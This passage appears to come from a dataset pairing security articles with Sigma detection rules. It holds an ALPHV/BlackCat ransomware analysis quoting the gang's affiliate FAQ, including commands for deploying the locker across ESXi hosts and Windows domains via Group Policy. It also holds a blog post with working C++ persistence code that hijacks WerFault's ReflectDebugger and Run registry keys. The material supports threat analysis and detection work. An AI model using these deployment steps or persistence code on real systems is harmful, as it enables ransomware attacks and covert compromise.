environments.\nTranscription: |\n  push esi\n  esp, 34h\n  mov [esp+3Ch+var_10], 0\n  mov [esp+3Ch+dwCoInit], 2 ; dwCoInit\n  mov [esp+3Ch+pvReserved], 0 ; pvReserved\n  call ds:CoInitializeEx\n  sub esp, 8\n  mov ebx, eax\n  lea eax, [esp+3Ch+var_10]\n  mov [esp+3Ch+var_34], 4 ; int\n  mov [esp+3Ch+dwCoInit], offset stru_6DB700 ; IID *\n  mov [esp+3Ch+pvReserved], offset a3e5fc7f99a5143 ;\n  mov [esp+3Ch+var_30], eax ; int\n  call sub_602BF0\n  test eax, eax\n  jnz short loc_602D65\n```\n\n*Figure 16: UAC bypass via the COM Elevation Moniker.*\n\nSuch UAC bypass capability was previously seen in the threat landscape embedded into ransomwares such as MedusaLocker, Avaddon, Revil, Darkside, BlackMatter. Note that strong TTP overlapping was reported between MedusaLocker and Avaddon but also Darkside and BlackMater as aforementioned.\n\n#### [TTPs of a LINUX’ payload]\n\nIn the same vein here is a JSON file format compatible with the MITRE ATT&CK Navigator of the shared **TTPs** of a representative payload targeting **Linux** systems (**VMWare ESXi**).\n\n#### Malware Behaviour Catalog (MBC)\n\nMBCobjectives and behaviours of representative **ALPHV Linux & Windows ransomware samples** are available in our GitHub. MBC mappings was generated via the MANDIANT’s open-source tool.\n\n### Threat actor\n\n#### **RaaS** program announcement (published on RAMP underground forum)\n\n**INTRO**\n\n*We are glad to welcome you to our affiliate program.*\n\n*We have taken into account all the advantages and disadvantages of previous partner programs and are proud to bring you* **ALPHV** *– the next generation of ransomware.*\n\n*All software is written from scratch, the decentralization of all web resources is architecturally laid down. A unique onion domain is generated for each new company. For each advertiser, an entrance is provided through its own unique onion domain (hello LockBit).*\n\n*Own datacenter for hosting leak files over 100 TB.*\n\n*We are already cooperating with top recovery companies that worked with darks, revils, etc.*\n\n*There is a support on chats, which sits 24 by 7, but if you wish, you can negotiate yourself.*\n\n**SECURITY**\n\n*We are in every possible way ready for existence in modern conditions, meeting all the requirements for the security of infrastructure and advertisements. In the affiliate program all possible links with forums are architecturally excluded (hello revil), algorithms for self-deletion of data upon expiration of the limitation period are laid down, a built-in mixer is integrated with a real break in the chain (not to be confused with Wasabi, BitMix and others), because you get completely clean coins from foreign exchanges. The wallets to which your coins were sent are unknown for our backend. The infrastructure is fragmented into the so-called. nodes that are interconnected through a whole network of pads within the onion network and are located behind NAT + FW. Even when receiving a full-fledged cmdshell, the attacker will not be able to reveal the real IP address of the server. (hi Conti)*\n\n**SOFTWARE**\n\n*The software is written from scratch without using any templates or previously leaked source codes of other ransomware. The choice is offered:*\n\n**4 encryption modes:**\n\n- *Full – full file encryption. The safest and slowest.*\n- *Fast – encryption of the first N megabytes. Not recommended for use, the most unsafe possible solution, but the fastest.*\n- *DotPattern – encryption of N megabytes through M step. If configured incorrectly, Fast can work worse both in speed and in cryptographic strength.*\n- *Auto. Depending on the type and size of the file, the locker (both on windows and * nix / esxi) chooses the most optimal (in terms of speed / security) strategy for processing files.*\n- *SmartPattern – encryption of N megabytes in percentage steps. By default, it encrypts 10 megabytes every 10% of the file starting from the header. The most optimal mode in the ratio of speed / cryptographic strength.*\n\n**2 encryption algorithms:**\n\n- *ChaCha20*\n- *AES*\n\n*In auto mode, the software detects the presence of AES hardware support (exists in all modern processors) and uses it. If there is no AES support, the software encrypts files ChaCha20.*\n\n*Cross-platform software, i.e. if you mount Windows disks in Linux or vice versa, the decryptor will be able to decrypt the files.*\n\n**Supported OS:**\n\n- *All line of Windows from 7 and higher (tested by us on 7, 8.1, 10, 11; 2008r2, 2012, 2016, 2019, 2022); XP and 2003 can be encrypted over SMB.*\n- *ESXI (tested on 5.5, 6.5, 7.0.2u)*\n- *Debian (tested on 7, 8, 9);*\n- *Ubuntu (tested on 18.04, 20.04)*\n- *ReadyNAS, Synology*\n\n*Since recently binaries have been leaking to analysts, and premium VT allows you to download samples and receive readme in chats, random people may appear who can disrupt negotiations (hello darkside), when launching the software it is MANDATORY to use the –access-token flag. The cmdline arguments are not passed to the AVers, which will keep the privacy of the correspondence with the victim. For the same reason, each encrypted computer generates its own unique ID used to separate chats.*\n\n*There is a function of automatic downloading of files from the MEGA service, you give a link to the files, they are automatically downloaded to our servers.*\n\n*You can get a full description of all functionality in the FAQ section.*\n\n**ACCOUNT**\n\n*If there is no activity for two weeks, your account will be frozen and subsequently deleted. To avoid this, we recommend that you notify the administration about possible vacations, pauses and other things.*\n\n*The rate is dynamic and depends on the amount of a single payment for each company, namely:*\n\n- *up to 1.5M $ – 80%*\n- *up to $ 3.0M – 85%*\n- *from $ 3.0M – 90%*\n\n*After reaching the $ 1.5M mark in terms of the sum of all payments on your account, you will have access to hosting services for files of companies’ leaks, dialing and DDoS’a absolutely free.*\n\n### FAQ dedicated to its affiliates (published on the public DLS of **ALPHV**)\n\n**Wed Nov 17 2021**\n\n*How – To*\n\n*How to start a locker on ESXi or * nix?*\n\n1. *Downloading the build via scp*\n\n**`scp sample_alfa_x86_64_linux_encrypt_app root@10.0.0.1:/tmp/`**\n\n- *We go via ssh and give execution rights*\n\n**`cd /tmp/ && chmod +x sample_alfa_x86_64_linux_encrypt_app`**\n\n- *Launch the locker **ALWAYS** with the token (obtained when creating the build) and in the background (**&**)*\n\n*`/tmp/sample_alfa_x86_64_linux_encrypt_app –access-token XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&`*\n\n- *To display the speed and encryption process, override the functions specified when creating the build, you can use the flags:*\n\n*`-p, –paths <PATHS> – forced indication of paths`*\n\n*`-v, –verbose – output the log to the console`*\n\n*`–no-vm-kill – do not stop VM (use if VMs are manually stopped, otherwise VM files will not be encrypted)`*\n\n*`–no-vm-snapshot-kill – do not delete snapshots (use if snapshots were manually removed)`*\n\n*`–ui – launch with a graphical interface`*\n\n**How to run Windows locker on one PC?**\n\n1. *Load the build and run cmd / powershell from the administrator, go to the folder with the locker and start ALWAYS with the token (obtained when creating the build)*\n\n**`./sample_alfa_x86_64_linux_encrypt_app.exe –access-token XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX`**\n\n- *To display the speed and encryption process, override the functions specified when creating the build, you can use the flags:*\n\n*`-p, –paths <PATHS> – forced indication of paths`*\n\n*`-v, –verbose – output the log to the console`*\n\n*`–no-net – do not encrypt network shares`*\n\n*`–no-prop – do not use the worm’s functionality (self-propagation by getting a list of ip in the arp table and trying to psexec with accounts hammered in for impersonation)`*\n\n*`–ui – launch with a graphical interface`*\n\n**How to run Windows locker on one PC using drag and drop?**\n\n1. *Load the build and run cmd / powershell as administrator, go to the folder with the locker and start ALWAYS with the token (obtained when creating the build) and the flag **–drag-and-drop-target***\n\n**`./sample_alfa_x86_64_linux_encrypt_app.exe –access-token XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX –drop-drag-and-drop-target`**\n\n- *A .bat file will appear in the folder with the locker, onto which you can drag files, folders, disks, etc.*\n\n**How to run Windows locker in the whole domain?**\n\n1. *Load the build on the **PDC** and run cmd / powershell as administrator, go to the folder with the locker and copy it to C:  WINDOWS  sysvol  sysvol  *yourdomain*  scripts*\n\n**`copy sample_alfa_x86_64_linux_encrypt_app.exe C:WINDOWSsysvolsysvol*yourdomain*scriptslocker.exe`**\n\n*The locker.exe file must be accessible via \\ yourdomain  netlogon  locker.exe*\n\n- *In the group policy editor, change the Default Group Policy or create a new one and link to Default.*\n- *Change Computer / User Configuration > Preferences > Control Panel Settings > Scheduled Tasks*\n- *When creating a new task on the General tab, fill in the name, description (optional), tick the Run with highest privileges checkbox and select the user SYSTEM*\n- *On the Actions tab, click New and fill in the fields as follows:*\n\n*Action → Start a program*\n\n*Program/script → cmd.exe*\n\n*Add arguments(optional) → /c \\yourdomainnetlogonlocker.exe –access-token XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX*\n\n*Start in (optional) → leave blank*\n\n- *We accept all changes through apply / ok and close the group policy editor.*\n- *On the PDC, we execute the gpupdate / force command, after a while the network will begin to be encrypted.*\n\n*A complete list of functions is available via -h, –help*\n\n### Domain analysis of the ALPHV’s infrastructure\n\nWhen investigating first the status of the host (resolved by the IP address *141.136.44[.]54*), the latter was found to be up and located in Lithuania Vilnius. Besides, all common ports are securely filtered or closed but the 80 (http), amongst which, a RDP port is available and very often used as the entry vector by brute forcing weak accounts. Passive HTTP server banners reveals that the attacker has set up an Apache server (with a current version installed being 2.4.29 though a 2.4.52 version was released the 2021-12-20) on an Ubuntu Linux distribution. The attackers have added a module to compress the traffic as shown by a passive analysis of the banners (content-encoding: gzip), most likely to lure malware scanners and keep surmise while upload/download operations get faster.\n\nWe found two domains that resolved to that the given IP address:\n\n- **support-global-it-ss[.]com**\n- **hosting-global-it-ss[.]com**\n\nThe homepages indicates that those websites proposes IT support services, which seem to belong to the same structure and could be legitimate. No direct link with the malicious activities emanating from the given IP could be established.",
    "sigma_rule": {
      "title": "MaxMpxCt Registry Value Changed",
      "id": "0e6a9e62-627e-496c-aef5-bfa39da29b5e",
      "status": "test",
      "description": "Detects changes to the \"MaxMpxCt\" registry value.\nMaxMpxCt specifies the maximum outstanding network requests for the server per client, which is used when negotiating a Server Message Block (SMB) connection with a client. Note if the value is set beyond 125 older Windows 9x clients will fail to negotiate.\nRansomware threat actors and operators (specifically BlackCat) were seen increasing this value in order to handle a higher volume of traffic.\n",
      "references": [
        "https://www.huntress.com/blog/blackcat-ransomware-affiliate-ttps",
        "https://securityscorecard.com/research/deep-dive-into-alphv-blackcat-ransomware",
        "https://www.intrinsec.com/alphv-ransomware-gang-analysis/?cn-reloaded=1",
        "https://www.sentinelone.com/labs/blackcat-ransomware-highly-configurable-rust-driven-raas-on-the-prowl-for-victims/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2024-03-19",
      "tags": [
        "attack.defense-evasion",
        "attack.t1070.005"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\Services\\LanmanServer\\Parameters\\MaxMpxCt"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_optimize_file_sharing_network.yml",
    "id": "985"
  },
  {
    "url": "https://cocomelonc.github.io/malware/2022/11/02/malware-pers-18.html",
    "markdown": "# Malware development: persistence - part 18. Windows Error Reporting. Simple C++ example.\n\n---\n\n```image\nAlt: pers\nDescription: The image displays a C++ code snippet for malware persistence via 'WerFault.exe', alongside a Windows PowerShell window showing commands related to registry manipulation. The code includes functions for opening registry keys, setting values, and managing a hijacked application. The PowerShell window shows a query for registry keys linked to Windows Error Reporting, with a dialogue box appearing that responds to the command with 'Meow-meow!'. This technical representation provides insights into malware development techniques.\nTranscription: |\n  cpp\n  // pers.cpp\n  // windows persistence via WerFault.exe\n  // author: (coco)lonc\n  // https://cocolonlc.github.io/malware/2022/11/02/malware-pers-17.html\n  #include <windows.h>\n  #include <string.h>\n  \n  int main(int argc, char* argv[]) {\n      HKEY hkey = NULL;\n      // malicious app\n      const char* exe = \"Z:\\\\2022-11-02-malware-pers-18\\\\hack.exe\";\n      // hijacked app\n      const char* wf = \"WerFault.exe -pr 1\";\n      // set evil app\n      LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE,\n          \"SOFTWARE\\\\Microsoft\\\\Windows Error Reporting\\\\Hang\",\n          0, KEY_SET_VALUE, &hkey);\n      if (res == ERROR_SUCCESS) {\n          // create new registry key\n          RegSetValueEx(hkey, (LPCSTR)\"ReflectDebugger\", 0,\n              REG_SZ, (LPBYTE)exe, strlen(exe) + 1);\n          RegCloseKey(hkey);\n      }\n      // startup\n      res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\",\n          0, KEY_SET_VALUE, &hkey);\n      if (res == ERROR_SUCCESS) {\n          // create new registry key\n          RegSetValueEx(hkey, (LPCSTR)\"meow\", 0,\n              REG_SZ, (LPBYTE)wf, strlen(wf) + 1);\n          RegCloseKey(hkey);\n      }\n      return 0;\n  }\n  ```\n  \n  ```\n  PS Z:\\2022-11-02-malware-pers-18> .\\pers.exe\n  PS Z:\\2022-11-02-malware-pers-18> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows Error Reporting\\Hang\"\n  ReflectDebugger    REG_SZ    Z:\\2022-11-02-malware-pers-18\\hack.exe\n  \n  PS Z:\\2022-11-02-malware-pers-18> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\n  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n      OneDrive    REG_SZ    C:\\Users\\User\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\n      meow    REG_SZ    C:\\Program Files\\Process Hacker 2\\ProcessHacker.exe\n      WerFault.exe -pr 1\n  ```\n  \n  ```\n  =^._.^= Meow-meow!\n```\n\nThis post is based on my own research into one of the more interesting malware persistence tricks: via `WerFault.exe`.\n\n### WerFault.exe\n\nWhile studying the behavior of Windows Error Reporting, I came across an interesting Registry path:\n\n```\nHKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\n```\n\nIf we run command\n\n```\nWerFault.exe -pr <value>\n```\n\nit is read\n\n```\nHKLM\\Software\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\\ReflectDebugger=<path_value>\n```\n\nThis command runs `WerFault.exe` in a mode which is called *“reflective debugger”* and it is very interesting. For example, run\n\n```\nWerFault.exe -pr 1\n```\n\nand check it via Sysinternals Process Monitor:\n\n```image\nAlt: pers\nDescription: The image displays a PowerShell window running the command `WerFault.exe -pr 1`, alongside a Sysinternals Process Monitor interface. The Process Monitor filter is set to include entries with the process name 'WerFault.exe'. Various process operations are being logged, and the filter conditions are highlighted, showing an emphasis on monitoring the behavior of the 'WerFault.exe' process during execution. This image is relevant as it illustrates the examination of Windows Error Reporting behavior in the context of malware persistence.\nTranscription: |\n  Process Monitor - Sysinternals. www.sysinternals.com\n  \n  Process Monitor Filter\n  Display entries matching these conditions:\n  Architecture is \n  \n  Column           Relation      Value            Action\n  -------------------------------------------------------\n  Process Name     contains      WerFault.exe     Include\n  Process Name     is            Procmom.exe      Exclude\n  Process Name     is            Procexp.exe      Exclude\n  Process Name     is            Autoruns.exe     Exclude\n  Process Name     is            Procmon64.exe    Exclude\n  Process Name     is            Procexp64.exe    Exclude\n  Operation        begins with   IRP_MJ_          Exclude\n  \n  [OK] [Cancel] [Apply]\n  \n  Showing 210 of 233,202 events (0.090%)\n  Backed by virtual memory\n  \n  C:\\Windows\\system32>\n```\n\n```image\nAlt: pers\nDescription: The image shows a screenshot of the Sysinternals Process Monitor application running on a Windows environment. The Process Monitor displays a list of events related to the execution of 'WerFault.exe' with the command line argument '-pr 1'. Each row represents a different operation performed by the process, including actions like 'Process Start', 'Thread Create', 'Load Image', and various registry access operations. The relevant registry path being accessed is displayed, showing interactions with 'HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\\ReflectDebugger'. The interface includes several details such as time, process name, process ID (PID), operation type, and result of each operation.\nTranscription: |\n  Time        Process Name    PID   Operation       Path\n  7:47:5...   WerFault.exe    88    Process Start   C:\\Windows\\System32\\WerFault.exe\n  7:47:5...   WerFault.exe    88    Thread Create    \n  7:47:5...   WerFault.exe    88    Load Image      C:\\Windows\\System32\\ntdll.dll\n  7:47:5...   WerFault.exe    88    RegOpenKey      HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Segment Heap\n  7:47:5...   WerFault.exe    88    RegOpenKey      HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\n  7:47:5...   WerFault.exe    88    RegOpenKey      HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\ResourcePolicies\n  7:47:5...   WerFault.exe    88    Load Image      C:\\Windows\\System32\\kernel32.dll\n  7:47:5...   WerFault.exe    88    RegOpenKey      HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\n  7:47:5...   WerFault.exe    88    RegCloseKey     \n  7:47:5...   WerFault.exe    88    Load Image      C:\\Windows\\System32\\msvcrt.dll\n  7:47:5...   WerFault.exe    88    RegOpenKey      HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Option\n  7:47:5...   WerFault.exe    88    RegOpenKey      HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Option\n  7:47:5...   WerFault.exe    88    RegOpenKey      HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\Parameters\n  7:47:5...   WerFault.exe    88    RegOpenKey      HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\Parameters\n  7:47:5...   WerFault.exe    88    RegCloseKey     \n  7:47:5...   WerFault.exe    88    Load Image      C:\\Windows\\System32\\GDI32.dll\n  7:47:5...   WerFault.exe    88    RegOpenKey      HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers\n  7:47:5...   WerFault.exe    88    RegOpenKey      HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers\n  7:47:5...   WerFault.exe    88    RegOpenKey      HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers\\TransparentEnabled\n  7:47:5...   WerFault.exe    88    RegOpenKey      HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers\n  7:47:5...   WerFault.exe    88    RegOpenKey      HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers\\LongPathsEnabled\n  7:47:5...   WerFault.exe    88    Load Image      C:\\Windows\\System32\\advapi32.dll\n  7:47:5...   WerFault.exe    88    RegOpenKey      HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Application\n  7:47:5...   WerFault.exe    88    RegCloseKey     \n  7:47:5...   WerFault.exe    88    Load Image      C:\\Windows\\System32\\user32.dll\n  7:47:5...   WerFault.exe    88    RegOpenKey      HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Application\n  7:47:5...   WerFault.exe    88    RegCloseKey     \n  \n  Result       Detail\n  SUCCESS      Parent PID: 3\n  SUCCESS      Image Base: \n  SUCCESS      Image Base: \n  REPARSE      NAME NOT FOUND\n  SUCCESS      Desired Access: \n  SUCCESS      Desired Access: \n  SUCCESS      Desired Access: \n  SUCCESS      Desired Access: \n  REPARSE      NAME NOT FOUND\n  REPARSE      NAME NOT FOUND\n  SUCCESS      Desired Access: \n  SUCCESS      Desired Access: \n  SUCCESS      Desired Access: \n  SUCCESS      Desired Access: \n  REPARSE      NAME NOT FOUND\n  SUCCESS      Desired Access: \n  SUCCESS      Desired Access: \n  SUCCESS      Desired Access: \n  SUCCESS      Desired Access: \n  SUCCESS      Desired Access: \n  SUCCESS      Desired Access: \n  SUCCESS      Desired Access: \n  SUCCESS      Desired Access: \n  SUCCESS      Desired Access: \n  SUCCESS      Desired Access: \n  SUCCESS      Desired Access: \n  SUCCESS      Desired Access:\n```\n\nAdd another filter:\n\n```image\nAlt: pers\nDescription: The image displays a screenshot from a Windows PowerShell session and the Sysinternals Process Monitor tool. In the foreground, the Process Monitor's filter settings are open, showing a filter that includes entries where the 'Process Name' is 'WerFault.exe' and the 'Result' is 'NAME NOT FOUND'. The background shows the PowerShell window where the command 'WerFault.exe -pr 1' has been executed. The image illustrates the behavior of the Windows Error Reporting (WER) mechanism and how it can be monitored for specific processes and results, supporting the analysis of potential vulnerabilities related to registry manipulation.\nTranscription: |\n  Process Monitor - Sysinternals - www.sysinternals.com\n  \n  Display entries matching these conditions:\n  Result is NAME NOT FOUND\n  \n  Column          Relation         Value\n  -----------------------------------------------\n  Process Name    contains         WerFault.exe\n  Result          is               NAME NOT FOUND\n  Process Name    is               Procmon.exe\n  Process Name    is               Procexp.exe\n  Process Name    is               Autoruns.exe\n  Process Name    is               Procexp64.exe\n  Process Name    is               System\n  \n  [OK] [Cancel] [Apply]\n```\n\nAs a result, we have a loophole for hijacking this value:\n\n```image\nAlt: pers\nDescription: The image shows a screenshot of the Sysinternals Process Monitor tool running on a Windows system. The top window displays a Windows PowerShell session where the command 'WerFault.exe -pr 1' is executed. Below, the Process Monitor logs various operations conducted by 'WerFault.exe', including registry queries related to 'HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\\ReflectDebugger'. This demonstrates how the executable interacts with the Windows registry, highlighting a potential method for malware persistence by hijacking the ReflectDebugger registry value.\nTranscription: |\n  Time        Process Name      PID  Operation        Path\n  7:47:55.    WerFault.exe      88   RegQueryValue    HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\ResourcePolicies\n  7:47:55.    WerFault.exe      88   RegOpenKey       HKLM\\System\\CurrentControlSet\\Control\\SafeBoot Option\n  7:47:55.    WerFault.exe      88   RegQueryKey      HKLM\\System\\CurrentControlSet\\Services\\Sr\\GP\\DLL\n  7:47:55.    WerFault.exe      88   RegQueryValue    HKLM\\Windows\\safer\\codeidentifiers\\TransparentEnabled\n  7:47:55.    WerFault.exe      88   RegQueryValue    HKLM\\Windows\\Safer\\CodeIdentifiers\n  7:47:55.    WerFault.exe      88   RegOpenKey       HKLM\\System\\CurrentControlSet\\Session Manager\\ResourcePolicies\n  7:47:55.    WerFault.exe      88   RegOpenKey       HKLM\\System\\CurrentControlSet\\Services\\SafeDllSearchMode\n  7:47:55.    WerFault.exe      88   RegQueryValue    HKLM\\Lsa\\FipsAlgorithmPolicy\\MDMEnabled\n  7:47:55.    WerFault.exe      88   RegQueryValue    HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\n  7:47:55.    WerFault.exe      88   RegQueryValue    HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\SystemHeap\n  7:47:55.    WerFault.exe      88   RegQueryValue    HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Private\n  7:47:55.    WerFault.exe      88   RegQueryValue    HKLM\\Software\\Microsoft\\Windows\\Error Reporting\n  7:47:55.    WerFault.exe      88   RegQueryValue    HKLM\\Security\\5fec44b7-451f-4afe-ced084013\n  7:47:55.    WerFault.exe      88   RegQueryValue    HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ErrorFlags\n  7:47:55.    WerFault.exe      88   RegQueryValue    HKLM\\Software\\Microsoft\\Windows\\Error Reporting\\Hangs\\ReflectDebugger\n```\n\nSo, what is the trick? We can replace the registry value\n\n```\nHKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\\ReflectDebugger\n```\n\nwith our evil application, because `WerFault.exe` not only reads this value but also runs it. And of course, we can use it for persistence.\n\n### Practical example\n\nFor simplicity, as usually, my “evil” application is just `meow-meow` messagebox (`hack.cpp`):\n\n```\n/*\nmeow-meow messagebox\nauthor: @cocomelonc\n*/\n#include <windows.h>\n#pragma comment (lib, \"user32.lib\")\nint WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\n  MessageBoxA(NULL, \"Meow-meow!\", \"=^..^=\", MB_OK);\n  return 0;\n}\n```\n\nAnd then, create a script which creates a registry key value with my “evil” app:\n\n```\nint main(int argc, char *argv[]) {\n  HKEY hkey = NULL;\n\n  // malicious app\n  const char *exe = \"Z:\\\\2022-11-02-malware-pers-18\\\\hack.exe\";\n\n  // hijacked app\n  const char *wf = \"WerFault.exe -pr 1\";\n\n  // set evil app\n  LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)\"SOFTWARE\\\\Microsoft\\\\Windows\\\\Windows Error Reporting\\\\Hangs\", 0, KEY_WRITE, &hkey);\n  if (res == ERROR_SUCCESS) {\n    // create new registry key\n    RegSetValueEx(hkey, (LPCSTR)\"ReflectDebugger\", 0, REG_SZ, (unsigned char*)exe, strlen(exe));\n    RegCloseKey(hkey);\n  }\n}\n```\n\nAlso, I used one of the classic tricks for persistence:\n\n```\n// startup\nres = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)\"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", 0, KEY_WRITE, &hkey);\nif (res == ERROR_SUCCESS) {\n  // create new registry key\n  RegSetValueEx(hkey, (LPCSTR)\"meow\", 0, REG_SZ, (unsigned char*)wf, strlen(wf));\n  RegCloseKey(hkey);\n}\n```\n\nAs a result, the final source code looks something like this (`pers.cpp`):\n\n```\n/*\npers.cpp\nwindows persistence via WerFault.exe\nauthor: @cocomelonc\nhttps://cocomelonc.github.io/malware/2022/11/02/malware-pers-18.html\n*/\n#include <windows.h>\n#include <string.h>\nint main(int argc, char *argv[]) {\n  HKEY hkey = NULL;\n\n  // malicious app\n  const char *exe = \"Z:\\\\2022-11-02-malware-pers-18\\\\hack.exe\";\n\n  // hijacked app\n  const char *wf = \"WerFault.exe -pr 1\";\n\n  // set evil app\n  LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)\"SOFTWARE\\\\Microsoft\\\\Windows\\\\Windows Error Reporting\\\\Hangs\", 0, KEY_WRITE, &hkey);\n  if (res == ERROR_SUCCESS) {\n    // create new registry key\n    RegSetValueEx(hkey, (LPCSTR)\"ReflectDebugger\", 0, REG_SZ, (unsigned char*)exe, strlen(exe));\n    RegCloseKey(hkey);\n  }\n\n  // startup\n  res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)\"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", 0, KEY_WRITE, &hkey);\n  if (res == ERROR_SUCCESS) {\n    // create new registry key\n    RegSetValueEx(hkey, (LPCSTR)\"meow\", 0, REG_SZ, (unsigned char*)wf, strlen(wf));\n    RegCloseKey(hkey);\n  }\n  return 0;\n}\n```\n\n### Demo\n\nLet’s go to see everything in action. Compile our “evil” app:\n\n```\nx86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive\n```\n\n```image\nAlt: pers\nDescription: The image shows a terminal session displaying the output of a command that compiles a C++ file named 'hack.cpp' into an executable named 'hack.exe'. The terminal output indicates the file sizes and permissions of the compiled executable, along with the source files present in the directory. The command used includes various flags for optimization and linking, suggesting it is part of a demonstration related to malware persistence techniques.\nTranscription: |\n  (cocomelonc✗ kali)-[~/hacking/cybersec_blog/2022-11-02-malware-pers-18]\n  $ x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdatas-sections -Wno-write-strings -fn-o-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive\n  \n  (cocomelonc✗ kali)-[~/hacking/cybersec_blog/2022-11-02-malware-pers-18]\n  $ ls -l\n  total 24\n  -rw-r--r-- 1 cocomelonc cocomelonc  232 Nov  2 04:35 hack.cpp\n  -rwxr-xr-x 1 cocomelonc cocomelonc 14848 Nov  2 04:54 hack.exe\n  -rw-r--r-- 1 cocomelonc cocomelonc  1049 Nov  2 04:34 pers.cpp\n  \n  (cocomelonc✗ kali)-[~/hacking/cybersec_blog/2022-11-02-malware-pers-18]\n  $\n```\n\nand persistence script:\n\n```\nx86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive\n```\n\n```image\nAlt: pers\nDescription: The image shows a terminal output in a Linux-like environment, displaying a list of files in a directory. The output includes timestamps and file permissions, with two specific files highlighted: 'pers.exe' and 'hack.exe'. The context suggests these are executable files related to a malware demonstration, showing their sizes and last modification times. This image provides relevant technical information about the compiled malware files.\nTranscription: |\n  (cocomelonc✗ kali) - [~/hacking/cybersec_blog/2022-11-02-malware-pers-18]\n  $ x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive\n  \n  (cocomelonc✗ kali) - [~/hacking/cybersec_blog/2022-11-02-malware-pers-18]\n  $ ls -lt\n  total 40\n  -rwxr-xr-x 1 cocomelonc cocomelonc 15360 Nov  2 04:55 pers.exe\n  -rwxr-xr-x 1 cocomelonc cocomelonc 14848 Nov  2 04:54 hack.exe\n  -rw-r--r-- 1 cocomelonc cocomelonc    232 Nov  2 04:35 hack.cpp\n  -rw-r--r-- 1 cocomelonc cocomelonc   1049 Nov  2 04:34 pers.cpp\n  \n  (cocomelonc✗ kali) - [~/hacking/cybersec_blog/2022-11-02-malware-pers-18]\n  $\n```\n\nBefore running everything, first of all, check the registry key and value:\n\n```\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\\\" /s\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\\ReflectDebugger\" /s\n```\n\nRun “malware” for checking correctness:\n\n```\n.\\hack.exe\n```\n\n```image\nAlt: pers\nDescription: The image depicts a Windows PowerShell window running on a virtual machine. It shows several commands being executed to interact with the Windows Error Reporting service, such as querying registry keys and running a malware executable called 'hack.exe'. There is also a pop-up message box displaying 'Meow-meow!' from the executed application. The command output indicates the current directory and lists files relevant to the malware demonstration, including 'hack.cpp' and 'pers.cpp'.\nTranscription: |\n  Administrator: Windows 